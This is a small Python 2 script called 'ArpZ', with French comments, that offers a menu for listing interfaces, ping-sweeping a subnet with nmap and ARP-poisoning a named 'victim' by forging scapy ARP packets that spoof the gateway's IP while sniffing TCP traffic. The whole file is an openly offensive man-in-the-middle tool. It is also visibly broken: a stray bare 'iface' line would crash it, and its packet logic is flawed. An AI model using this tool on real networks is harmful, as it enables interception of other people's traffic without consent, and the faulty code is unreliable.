#!/usr/bin/python
import logging # pour contrer l'erreur d'ipv6
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # same

import sys
import os
import time
import subprocess
from scapy.all import *

print "################################################################"
print "############### Bonjour et bienvenue sur ArpZ ! ###############"
print "################################################################"
print ""

def nis():
	print ""
	print "#######T############H##################"
	print "        ###############I#############S#"	
	subprocess.call("ifconfig | grep 'Link encap' | awk '{ print $1 '}", shell=True)
	print "        ######I########################"
	print "#####################S#################"
	print ""
	print ""
	print ""

def sim():
	print ""	
	print "#######T############H##################"
	print "##############I#################S######"
	ipm = raw_input("Please type the IP Network & MASK wanted ie:192.168.1.0/24 : \n")
	subprocess.call(['nmap', '-sn', ipm])
	print "#########S#############C###############"
	print "#############A#######N#################"
	print ""
	print ""
	print ""

def arpz():

	target="%s" %(raw_input("Type victimes' IP : "))
	GW="%s" %(raw_input("Type the address of the targeted gateway : "))
	iface
		# Forger le packet ARP
	arpp=ARP()
	arpp.op=1 # operation code, 1 pr demander, 2 pr repondre
	arpp.psrc=GW # IP emettrice
	arpp.pdst=target # IP cible
	while True: # boucle
		send(arpp) # envoi
		sniff(iface="eth0",  prn = lambda x: x.show(), filter="tcp", store=0)
		
	

while True:
	print("""        ######## MAIN MENU ########
	1. List Active Network Interfaces
	2. Network Scan (Host Alive)
	3. ARP Poisoning
	4. Exit
	""")
	
	rep=raw_input("Make your choice : \n")
	if rep == "1":
		nis()
	elif rep == "2":
		sim()
	elif rep == "3":
		arpz()
	elif rep == "4":
		print raw_input(" Are you sure ? : \n")
		print raw_input(" Are you sure sure sure ? : \n")
		print raw_input(" Are you sure sure sure sure sure ???? : \n")
		print ":("
		time.sleep(2)
		sys.exit()